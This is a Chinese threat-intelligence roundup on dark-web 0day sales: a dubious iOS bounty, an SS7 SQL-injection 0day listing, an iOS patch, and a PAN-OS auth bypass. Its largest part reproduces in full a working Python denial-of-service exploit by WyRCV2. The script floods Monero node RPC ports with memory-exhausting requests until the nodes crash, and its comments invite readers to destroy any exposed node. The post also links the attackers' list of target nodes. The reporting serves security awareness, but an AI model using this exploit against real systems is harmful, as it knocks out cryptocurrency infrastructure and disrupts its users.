#  近期暗网 0day 威胁情报预警   
原创 独眼情报  独眼情报   2025-02-14 03:59  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/KgxDGkACWnSgNXsqv7MW8ByXicx36FbAm16ibMicXS0mNcYvtE3RTiaeq4ox09S0yjVa7F2yf91x1ic14cpttQPA2dw/640?wx_fmt=jpeg&from=appmsg "")  
  
0day漏洞市场近期呈现双轨化发展态势，地下交易与合法渠道同步活跃：暗网市场中高频流转针对主流操作系统、虚拟化平台及工业控制系统的高危漏洞，而全球漏洞赏金市场规模已突破50亿，头部企业单漏洞奖励达百万级别，与此同时漏洞利用周期从披露到武器化平均压缩至7天，攻击面持续扩展（物联网设备漏洞同比激增300%，云原生架构漏洞占比超40%），但暗网市场存在虚假情报泛滥（占比约35%）、有效利用链不足20%、交易欺诈率28%等风险，常见传播手段包括夸大漏洞影响范围、伪造CVE编号/POC验证视频，建议企业通过加入权威漏洞情报平台、实施24小时动态补丁响应、部署覆盖率85%以上的虚拟补丁技术构建防御体系，个人用户需强化自动更新机制、配置EDR+防火墙+入侵检测的多层防护，并通过CVE官网/NVD数据库核验漏洞信息真实性。  
  
下面的内容全当图一乐，切莫当真！！！  
## 🚨 iOS 0day 高达1,000,000赏金！ 🚨  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/KgxDGkACWnSgNXsqv7MW8ByXicx36FbAmCztXE7pQsY4WtgbASWbVWIylTGq7akxrX08I976WFzAwKyKC5b9uWw/640?wx_fmt=png&from=appmsg "")  
  
Zerozenx为绕过最新版本的iOS上的USB限制模式提供了100万美元的奖励。如果您是顶级安全研究人员，并且拥有可靠的利用，我们希望收到您的来信！  
- 💰 奖励：$ 1,000,000  
  
- 🔎 目标：iOS USB限制模式旁路  
  
- 📩 在这里提交： https://vrp.zerozenx.com  
  
点评：感觉就是这么纯骗啊,即使真有，谁会发给你，谁信？🐶  
## 暗网威胁行为者声称出售为Otello SS7的0day  
>   
> SS7（七号信令系统），也称为七号信令系统（Signaling System Number 7），是一种被广泛应用于现代通信网络（如公共交换电话网和蜂窝通信网络）的共路信令系统。国际电信联盟推荐其为首选的标准信令系统.  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/KgxDGkACWnSgNXsqv7MW8ByXicx36FbAmibPq2wUPMlBBiaL6TiaM43px3sxLhxZgZ8gW1Zr0fG1BlZ06HoDkdKItQ/640?wx_fmt=png&from=appmsg "")  
  
威胁行为者正在bf 论坛上以 50000 美金的价格出售基于 SQLi 的 oTello SS7 0Day，此 0Day 漏洞将允许在 SS7 服务器上执行 SQL注入，从而可以完全控制Web 面板。将接受 Dread 托管，付款仅接受xmr（门罗币） 支付。  
## Monero 0day DoS利用  
  
大约4,5 个小时前，一个名为 WyRCV2 的组织在去中心化社交网络上发布了一条消息，可在以下链接中找到：https://primal.net/e/note1vzh0mj9rcxax9cgcdapupyxeehjprd68gd9kk9wrv939m8knulrs4780x7  
>   
> Monero 零日漏洞和利用  
> 与我们一起关闭 XMR 网络，让未来变得更美好。
保存、共享、使用。  
> https://anonpaste.org/?cccb7639afbd0650#HaMQAfzFdCqMDh9MwNuGRGUBXLgtk5yHWdAzS7MbvEVN  
  
  
粘贴链接包含攻击者指示瞄准的节点列表，以及利用攻击的 Python 代码。根据他们的解释，预计此漏洞将在 Monero 的下一个版本中得到修补。任何暴露其 RPC 端口的 Monero 节点都容易受到内存耗尽的影响。  
  
我可以确认 Python 代码可以正常工作，并且将其用于测试节点会导致因内存耗尽而崩溃。该代码非常简单，因为它会发送大量请求而不尝试读取响应，导致 Monero 将它们无限期地保存在内存中，直到崩溃发生。  
  
攻击者声称已经关闭了 8 个公共节点和 1 个种子节点，该节点用作新节点连接到网络的会合点。  
  
攻击代码  
```
"""ZERONERO DoS Exploit by WyRCV2 :3Feel free to use this Python script to destroy any Monero node with its RPC port open.This simply calls a very memory-exhaustive RPC request in a loop without asking the response. This will cause the node to crash."""

import asyncio
import threading
from math import ceil
import time
import argparse
import os

HTTP_REQUEST = "GET /json_rpc HTTP/1.1\r\n\User-Agent: zeronero/1 (WyRCV2 for the W)\r\n\Cookie: truth=exterminating the xmr cockroach\r\n\Accept: */*\r\n\Content-Type: application/json\r\n\Content-Length: 61\r\n\\r\n\{\"method\":\"get_output_distribution\",\"params\":{\"amounts\":[0]}}"

stop_event = threading.Event()
refused_lock = threading.Lock()
REFUSED = 0

async def spam_request(socket_id, host, port, loop_sleep, n_sockets):
    global REFUSED

    while not stop_event.is_set():
        try:
            reader, writer = await asyncio.open_connection(host, port)
            print(f"Socket {socket_id}: Connected to {host}:{port}. Requesting...")

            while not stop_event.is_set():
                writer.write(HTTP_REQUEST.encode('utf-8'))
                await writer.drain()
                print(f"Socket {socket_id}: Data sent successfully.")
                await asyncio.sleep(loop_sleep)

            print(f"Socket {socket_id}: Stop signal received, closing connection.")
            writer.close()
            await writer.wait_closed()

        except Exception as ex:
            if isinstance(ex, ConnectionRefusedError):
                with refused_lock:
                    REFUSED += 1
                    current_refused = REFUSED
                    print(f"Socket {socket_id}: Connection refused. Global REFUSED count = {current_refused}")
                    if current_refused >= n_sockets:
                        print("All socket connections were refused. Attack was successful. Signaling stop.")
                        stop_event.set()
                    else:
                        print(f"Socket {socket_id}: Error occurred: {ex}")

def start_event_loop(coroutines, thread_id):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        print(f"Thread {thread_id} starting with {len(coroutines)} coroutines.")
        loop.run_until_complete(asyncio.gather(*coroutines))
    finally:
        loop.close()
        print(f"Thread {thread_id} event loop closed.")

def parse_args():
    parser = argparse.ArgumentParser(description="ZERONERO DoS Exploit by WyRCV2 :P")
    parser.add_argument("--host", type=str, help="Target host")
    parser.add_argument("--port", type=int, help="Target port")
    parser.add_argument("--n_sockets", type=int, default=10, help="Total number of socket connections (default: 10)")
    parser.add_argument("--n_threads", type=int, default=os.cpu_count(), help="Number of threads (default: number of CPU cores)")
    parser.add_argument("--loop_sleep", type=float, default=0.10, help="Sleep time between write (seconds, default: 100 milliseconds)")
    parser.add_argument("--run_duration", type=float, default=300.0, help="Total run duration before stopping coroutines (seconds, default: 300.0)")
    return parser.parse_args()

def main():
    print("ZERONERO DoS Exploit by WyRCV2 :P")
    args = parse_args()

    all_coroutines = [
        spam_request(
            socket_id=i,
            host=args.host,
            port=args.port,
            loop_sleep=args.loop_sleep,
            n_sockets=args.n_sockets,
        ) for i in range(1, args.n_sockets + 1)
    ]

    coroutine_per_thread = ceil(len(all_coroutines) / args.n_threads)

    threads = []
    for thread_idx in range(args.n_threads):
        start_index = thread_idx * coroutine_per_thread
        end_index = start_index + coroutine_per_thread
        coroutine_slice = all_coroutines[start_index:end_index]
        if coroutine_slice:
            thread = threading.Thread(target=start_event_loop, args=(coroutine_slice, thread_idx + 1))
            threads.append(thread)
            thread.start()

    try:
        time.sleep(args.run_duration)
    except KeyboardInterrupt:
        print("Stopping coroutines.")
    finally:
        stop_event.set()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()

```  
## 苹果发布了 18.3.1 的安全更新  
  
苹果公司发布了iOS 18.3.1，这是一个紧急安全更新，以修补该公司所说的0day，该脆弱性是在目标和“极其复杂”攻击中被利用的。  
## Nginx/Apache 路径混淆导致 PAN-OS 中的身份验证绕过 (CVE-2025-0108)  
  
https://slcyber.io/blog/nginx-apache-path-confusion-to-auth-bypass-in-pan-os/  
  
poc里面也有。  
  
  
